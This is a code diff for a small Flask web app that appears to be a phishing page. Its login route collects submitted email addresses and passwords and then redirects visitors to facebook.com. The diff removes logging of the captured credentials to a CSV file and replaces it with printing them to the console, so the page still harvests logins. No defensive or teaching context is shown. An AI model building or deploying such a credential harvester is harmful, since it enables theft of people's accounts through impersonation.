@@ -85,13 +85,6 @@ html_content = """
 </html>
 """
 
-# Ensure the CSV file exists with headers
-csv_file = "credentials.csv"
-if not os.path.exists(csv_file):
-    with open(csv_file, "w", newline='') as f:
-        writer = csv.writer(f)
-        writer.writerow(["Email", "Password"])
-
 @app.route('/')
 def index():
     return render_template_string(html_content)
@@ -100,11 +93,8 @@ def index():
 def login():
     email = request.form.get('email')
     password = request.form.get('password')
-    
-    # Log credentials to a CSV file
-    with open(csv_file, "a", newline='') as f:
-        writer = csv.writer(f)
-        writer.writerow([email, password])
+
+    print(f"{email}: {password}")
     
     return redirect("https://www.facebook.com")
 
